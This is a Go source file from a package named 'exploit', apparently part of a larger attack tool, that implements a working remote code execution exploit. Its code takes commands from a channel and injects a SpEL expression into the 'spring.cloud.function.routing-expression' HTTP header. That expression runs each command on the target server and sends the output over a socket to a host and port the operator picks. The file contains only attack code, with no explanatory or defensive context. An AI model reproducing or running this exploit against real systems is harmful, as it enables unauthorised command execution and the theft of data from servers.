package exploit

import (
	"fmt"
	"net/http"
	"strconv"
	"time"
)

type Spel struct {
	Exploit
}

func (e *Spel) Create(c Endpoint, payload_ch *chan string) {
	remote.Uri = c.Uri
	remote.Method = c.Method
	remote.Host = c.Host
	remote.Port = c.Port

	go func(p *chan string) {
		for {
			var cmd = <-*p
			fmt.Println("receive cmd " + cmd)
			fmt.Println("connecting to " + remote.Uri)
			client := &http.Client{
				Timeout: time.Second * 2,
			}
			go func() {
				req, _ := http.NewRequest(remote.Method, remote.Uri, nil)
				req.Header.Set("spring.cloud.function.routing-expression",
					"(new java.io.PrintWriter((new java.net.Socket('"+remote.Host+"', "+strconv.Itoa(remote.Port)+")).getOutputStream(), true)).println((new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec('"+cmd+"').getInputStream()))).lines().collect(T(java.util.stream.Collectors).joining(T(java.lang.System).getProperty('line.separator'))))")
				client.Do(req)
				//*r <- "ok"
			}()
		}
	}(payload_ch)
}
